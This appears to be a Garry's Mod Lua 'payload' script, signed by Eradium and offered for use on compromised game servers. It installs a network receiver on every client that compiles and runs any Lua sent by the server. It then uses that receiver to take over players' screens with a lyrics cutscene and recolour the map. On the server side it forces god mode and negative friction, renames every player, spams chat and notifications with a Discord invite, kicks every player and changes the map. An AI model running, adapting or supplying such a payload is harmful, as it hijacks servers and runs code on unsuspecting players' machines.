-- Server Side

-- Payload Created by Eradium for Github

-- Visuel Brand New World

-- Reproduction Not Autorised

-- Modification Autorised : Configuration section

-- Beta1.0 (30-07-2020)

local function rdm_str(len)
	if not len or len <= 0 then return "" end
	return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)]
end

local net_string = rdm_str(25)

util.AddNetworkString(net_string)
BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "ifyouseethisdontpanicitsme",function(ply)
    if not ply:IsBot() then
    	ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
    end
end)

local function EradiumToClient(code)
    local data = util.Compress(code)
    local len = #data
    net.Start(net_string)
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end

-- Configuration Serveur

local rpname = "I <3 Eradium"
local rpjob = "I've got Eradiumed"
local printtoconsole = [[

██████╗ ██████╗  █████╗ ███╗   ██╗██████╗  
██╔══██╗██╔══██╗██╔══██╗████╗  ██║██╔══██╗ 
██████╔╝██████╔╝███████║██╔██╗ ██║██║  ██║ 
██╔══██╗██╔══██╗██╔══██║██║╚██╗██║██║  ██║ 
██████╔╝██║  ██║██║  ██║██║ ╚████║██████╔╝ 
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  
                                           
███╗   ██╗███████╗██╗    ██╗               
████╗  ██║██╔════╝██║    ██║               
██╔██╗ ██║█████╗  ██║ █╗ ██║               
██║╚██╗██║██╔══╝  ██║███╗██║               
██║ ╚████║███████╗╚███╔███╔╝               
╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝                
                                           
██╗    ██╗ ██████╗ ██████╗ ██╗     ██████╗ 
██║    ██║██╔═══██╗██╔══██╗██║     ██╔══██╗
██║ █╗ ██║██║   ██║██████╔╝██║     ██║  ██║
██║███╗██║██║   ██║██╔══██╗██║     ██║  ██║
╚███╔███╔╝╚██████╔╝██║  ██║███████╗██████╔╝
 ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ 
                                         
]]


-- Cette option permet au serveur de kick les joueurs une fois le payload fini
local kickafterpayload = true
local kickmessage = "\n[FR] Oh désolé, je ne me suis pas présenté ,je suis BNW, votre serveur a rencontré un problème que j'ai corrigé, vous pouvez maintenant retourner sur votre serveur !\n\n\nMyPanel( https://discord.gg/abcdef )\n\n------------------------------------------\n\n[EN] Oh sorry, I didn't introduce myself ,I'm BNW, your server has encountered a problem that I fixed, you can now go back to your server !\n\n\nCodially MyPanel( https://discord.gg/abcdef )"

-- Cette option permet au serveur de reboot la map une fois le payload fini
local restartafterpayload = true


local frictionamplif = true
local godmodeveryone = true



-- /Configuration

for k, v in pairs(player.GetAll()) do
	v:setDarkRPVar( "rpname", rpname )
	v:setDarkRPVar( "job", rpjob )
	if godmodeveryone == true then 
		v:GodEnable()
	end
end

if frictionamplif == true then 
	RunConsoleCommand("sv_friction", "-50")
end

print(printtoconsole)

timer.Simple(1, function()
    EradiumToClient([==[

-- Client Side

-- Payload Created by Eradium for Github

-- Visuel BNW

-- Reproduction Not Autorised

-- Modification Autorised : Configuration section

-- Beta1.0 (30-07-2020)

if ( timer.Exists( "TimeSV" ) ) then
	timer.Destroy("TimeSV")
end

-- Configuration Client

local printtoconsole = [[

██████╗ ██████╗  █████╗ ███╗   ██╗██████╗  
██╔══██╗██╔══██╗██╔══██╗████╗  ██║██╔══██╗ 
██████╔╝██████╔╝███████║██╔██╗ ██║██║  ██║ 
██╔══██╗██╔══██╗██╔══██║██║╚██╗██║██║  ██║ 
██████╔╝██║  ██║██║  ██║██║ ╚████║██████╔╝ 
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  
                                           
███╗   ██╗███████╗██╗    ██╗               
████╗  ██║██╔════╝██║    ██║               
██╔██╗ ██║█████╗  ██║ █╗ ██║               
██║╚██╗██║██╔══╝  ██║███╗██║               
██║ ╚████║███████╗╚███╔███╔╝               
╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝                
                                           
██╗    ██╗ ██████╗ ██████╗ ██╗     ██████╗ 
██║    ██║██╔═══██╗██╔══██╗██║     ██╔══██╗
██║ █╗ ██║██║   ██║██████╔╝██║     ██║  ██║
██║███╗██║██║   ██║██╔══██╗██║     ██║  ██║
╚███╔███╔╝╚██████╔╝██║  ██║███████╗██████╔╝
 ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ 
                                         
]]

local lyric1 = "Hey !"
local lyric2 = "Are you,"
local lyric3 = "Ready to go ?"
local lyric4 = "'Cuz, you know"
local lyric5 = "The way to go."
local lyric6 = "Shinjitai eranda way"
local lyric7 = "Sā ikō"
local lyric8 = "The brand new world !"

local toBNW1 = "he brnd ne wold"
local toBNW2 = "e brd n wod"
local toBNW3 = "br n wd"
local toBNW4 = "b n w"
local bnw = "BNW"

local panelname = "MyPanel"
local panelnameglitch = { "MyPanel", "MyPAnel", "MyPan€l", "MyP4n€l", "MIP4n€l", "mYp4nel", "mYpAn€l", "WYP4n€L", "MYPANXL", "MYPANEL", "ERROR" }
local panelfirstletter = "M"
local discord = "https://discord.gg/abcdef"

local notif1 = "Owner"
local notif2 = "CoOwner"
local notif3 = "Admin1"
local notif4 = "Admin2"
local notif5 = "Friend1"
local notif6 = "Friend2"

-- Only for dev purpose
local enabletimer = false
local loglyrics = false


-- /Configuration

print(printtoconsole)

surface.CreateFont( "PixelCutsceneScaled",{ font = "Open Sans", size = 500, weight = 1000, antialias = true })
surface.CreateFont( "PixelCutsceneScaledMiddle",{ font = "Open Sans", size = 150, weight = 1000, antialias = true })
surface.CreateFont( "PixelCutsceneScaledSmall",{ font = "Open Sans", size = 50, weight = 1000, antialias = true })
surface.CreateFont( "PixelSmall",{ font = "Open Sans", size = 135, weight = 500, antialias = false })
surface.CreateFont("lapolice", { font = "Open Sans", size = ScrW()*0.02, weight = 10, blursize = 0, scanlines = 2.5, antialias = false })

local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8) local w,h = ScrW(), ScrH() local W, H = ScrW(), ScrH()
local MySelf = LocalPlayer()

if kpderma then kpderma:Remove()
	kpderma = nil end
	kpderma = vgui.Create( "DFrame" )
	kpderma:SetSize( w, h )
	kpderma:SetPos(0,0)
	kpderma:SetDraggable ( false )
	kpderma:SetTitle("")
	kpderma:ShowCloseButton(false)
	kpderma.Paint = function( self )
	surface.SetDrawColor(30, 30, 30, 0)
end

local pw, ph = w, h*0.6 local px, py = w/2-pw/2, h/2-ph/2

local Close = vgui.Create( "DButton", kpderma )
Close:SetPos(px, py)
Close:SetText( "" )
Close:SetSize( pw, ph )
Close.Paint = function( self, tw, th )
end



SOUNDSTART_CTP = false
OZJFOZJCEZIO = true
sound.PlayURL("https://www.dropbox.com/s/wepx6g25eosecow/ready-to.mp3?dl=1", "mono noblock noplay", function(s)
	if not s then
		return
	end
	if SOUNDSTART_CTP then
		s:Stop()
		return
	end
	SOUNDSTART_CTP = true
	s:SetVolume(6.5)
	s:Play()
	startpayload()
	if enabletimer == true then
		local svtick_key = 0
		timer.Create("TimeSV", 1, 0, function()
	    	svtick_key = svtick_key + 1
	    	print(svtick_key)
		end)
	end
end)



function startpayload()

	timer.Simple(0.5, function()
		if loglyrics == true then
			print(lyric1)
		end
		Close:SetPos(px, py)
		Close:SetText( "" )
		Close:SetSize( pw, ph )
		Close.Paint = function( self, tw, th )
			local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8)
			local shift = math.sin(RealTime()*3)*1.5 + 5
			draw.SimpleText( lyric1, "PixelCutsceneScaled", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
			draw.SimpleText( lyric1, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end
	end)

	timer.Simple(1.3, function()
		if loglyrics == true then
			print(lyric2)
		end
		Close.Paint = function( self, tw, th )
			local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8)
			local shift = math.sin(RealTime()*3)*1.5 + 5
			draw.SimpleText( lyric2, "PixelCutsceneScaledMiddle", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
			draw.SimpleText( lyric2, "PixelCutsceneScaledMiddle", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end
	end)

	timer.Simple(2.2, function()
		if loglyrics == true then
			print(lyric3)
		end
		Close.Paint = function( self, tw, th )
			local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8)
			local shift = math.sin(RealTime()*3)*1.5 + 5
			draw.SimpleText( lyric3, "PixelCutsceneScaledMiddle", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
			draw.SimpleText( lyric3, "PixelCutsceneScaledMiddle", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end
	end)

	timer.Simple(3.9, function()
		if loglyrics == true then
			print(lyric4)
		end
		Close.Paint = function( self, tw, th )
			local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8)
			local shift = math.sin(RealTime()*3)*1.5 + 5
			draw.SimpleText( lyric4, "PixelCutsceneScaledMiddle", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
			draw.SimpleText( lyric4, "PixelCutsceneScaledMiddle", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end
	end)

	timer.Simple(5.1, function()
		if loglyrics == true then
			print(lyric5)
		end
		Close.Paint = function( self, tw, th )
			local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8)
			local shift = math.sin(RealTime()*3)*1.5 + 5
			draw.SimpleText( lyric5, "PixelCutsceneScaledMiddle", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
			draw.SimpleText( lyric5, "PixelCutsceneScaledMiddle", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end
	end)	

	timer.Simple(7.2, function()
		if loglyrics == true then
			print(lyric6)
		end
		Close.Paint = function( self, tw, th )
			local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8)
			local shift = math.sin(RealTime()*3)*1.5 + 5
			draw.SimpleText( lyric6, "PixelCutsceneScaledMiddle", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
			draw.SimpleText( lyric6, "PixelCutsceneScaledMiddle", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end
	end)

	timer.Simple(10.5, function()
		if loglyrics == true then
			print(lyric7)
		end
		Close.Paint = function( self, tw, th )
			local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8)
			local shift = math.sin(RealTime()*3)*1.5 + 5
			draw.SimpleText( lyric7, "PixelCutsceneScaled", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
			draw.SimpleText( lyric7, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end
	end)

	timer.Simple(12, function()
		if loglyrics == true then
			print(lyric8)
		end
		Close.Paint = function( self, tw, th )
			local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8)
			local shift = math.sin(RealTime()*3)*1.5 + 5
			draw.SimpleText( lyric8, "PixelCutsceneScaledMiddle", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
			draw.SimpleText( lyric8, "PixelCutsceneScaledMiddle", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end
	end)

	timer.Simple(14, function()
		Close.Paint = function( self, tw, th )
			local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8)
			local shift = math.sin(RealTime()*3)*1.5 + 5
			draw.SimpleText( toBNW1, "PixelCutsceneScaledMiddle", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
			draw.SimpleText( toBNW1, "PixelCutsceneScaledMiddle", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end
	end)

	timer.Simple(14.5, function()
		Close.Paint = function( self, tw, th )
			local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8)
			local shift = math.sin(RealTime()*3)*1.5 + 5
			draw.SimpleText( toBNW2, "PixelCutsceneScaledMiddle", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
			draw.SimpleText( toBNW2, "PixelCutsceneScaledMiddle", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end
	end)

	timer.Simple(15, function()
		Close.Paint = function( self, tw, th )
			local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8)
			local shift = math.sin(RealTime()*3)*1.5 + 5
			draw.SimpleText( toBNW3, "PixelCutsceneScaledMiddle", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
			draw.SimpleText( toBNW3, "PixelCutsceneScaledMiddle", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end
	end)

	timer.Simple(15.5, function()
		Close.Paint = function( self, tw, th )
			local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8)
			local shift = math.sin(RealTime()*3)*1.5 + 5
			draw.SimpleText( toBNW4, "PixelCutsceneScaledMiddle", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
			draw.SimpleText( toBNW4, "PixelCutsceneScaledMiddle", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end
	end)

	timer.Simple(16, function()
		Close.Paint = function( self, tw, th )
			local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8)
			local shift = math.sin(RealTime()*3)*1.5 + 5
			draw.SimpleText( bnw, "PixelCutsceneScaled", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
			draw.SimpleText( bnw, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end
	end)

	timer.Simple(27, function()
		local mats = Entity(0):GetMaterials()

		for k,v in pairs(mats) do
			Material(v):SetVector("$color", Vector(238,107,255))
			Material(v):SetTexture( "$basetexture", "_rt_fullframefb" )
		end

		hook.Add("HUDPaint", "AfficheMoiCesBellesCouleurs",function()
			for k,v in pairs(gfx) do
				v()
			end
		end)


		Close.Paint = function( self, tw, th ) end
		function GAMEMODE:PostDraw2DSkyBox()
    		local col = Color( 75, 0, 130)
    		render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    	 	return !!1
	 	end
	 	function GAMEMODE:PreDrawSkyBox()
    	 	local col = Color( 75, 0, 130)
    	 	render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    	 	return !!1
	 	end

timer.Create("spamchatbienchiant", 1.5, 0, function()
    local time = tonumber(0)
    local Message = {
    panelfirstletter.." "..panelname.." "..discord.." -",
    panelfirstletter..panelfirstletter.." "..panelname.." "..discord.." --",
    panelfirstletter..panelfirstletter..panelfirstletter.." "..panelname.." "..discord.." ---",
    panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter.." "..panelname.." "..discord.." ----",
    panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter.." "..panelname.." "..discord.." -----",
    panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter.." "..panelname.." "..discord.." ------",
    panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter.." "..panelname.." "..discord.." -------",
    panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter.." "..panelname.." "..discord.." --------",
    panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter.." "..panelname.." "..discord.." ---------",
    panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter.." "..panelname.." "..discord.." -------",
    panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter.." "..panelname.." "..discord.." -------",
    panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter.." "..panelname.." "..discord.." ------",
    panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter.." "..panelname.." "..discord.." -----",
    panelfirstletter..panelfirstletter..panelfirstletter..panelfirstletter.." "..panelname.." "..discord.." ----",
    panelfirstletter..panelfirstletter..panelfirstletter.." "..panelname.." "..discord.." ---",
    panelfirstletter..panelfirstletter.." "..panelname.." "..discord.." --",
    panelfirstletter.." "..panelname.." "..discord.." -",
    }

    for _, line in pairs(Message) do
        time = time + tonumber(0.1)
        timer.Simple(time,function()
            chat.AddText(HSVToColor( CurTime() % 6 * 60, 1, 1 ),line)
        end)
    end
end)

timer.Create("notif1", 0.3, 0, function()
    notification.AddLegacy( notif1, math.random(0, 4), 1.5 )
end)

timer.Create("notif2", 0.3, 0, function()
    notification.AddLegacy( notif2, math.random(0, 4), 1.5 )
end)

timer.Create("notif3", 0.3, 0, function()
    notification.AddLegacy( notif3, math.random(0, 4), 1.5 )
end)

timer.Create("notif4", 0.3, 0, function()
    notification.AddLegacy( notif4, math.random(0, 4), 1.5 )
end)

timer.Create("notif5", 0.3, 0, function()
    notification.AddLegacy( notif5, math.random(0, 4), 1.5 )
end)

timer.Create("notif6", 0.3, 0, function()
    notification.AddLegacy( notif6, math.random(0, 4), 1.5 )
end)

timer.Create("madebyera", 0.3, 0, function()
    notification.AddLegacy( "Payload par Eradium <3", math.random(0, 4), 1.5 )
end)


	end)

	timer.Simple(59.5, function()

		Close.Paint = function( self, tw, th )
			local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8) local shift = math.sin(RealTime()*3)*1.5 + 5
			draw.SimpleText( "Made by Eradium", "PixelCutsceneScaledSmall", tw/2 , th/2 +100, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
			draw.SimpleText( "Made by Eradium", "PixelCutsceneScaledSmall", tw/2 - shift , th/2 +100 - shift, Color(math.random(240,255), math.random(240,255), math.random(240,255), 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
			draw.SimpleText( table.Random(panelnameglitch), "PixelCutsceneScaled", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) draw.SimpleText( table.Random(text), "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color( 0, 191, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end

	end)



end


    ]==])
end)

timer.Simple(209, function()
	if kickafterpayload == true then
		for i,v in ipairs(player.GetAll()) do 
			v:Kick(kickmessage)
		end
	end 
end)


timer.Simple(210, function()
	if restartafterpayload == true then
		RunConsoleCommand("changelevel", "gm_construct")
	end
end)
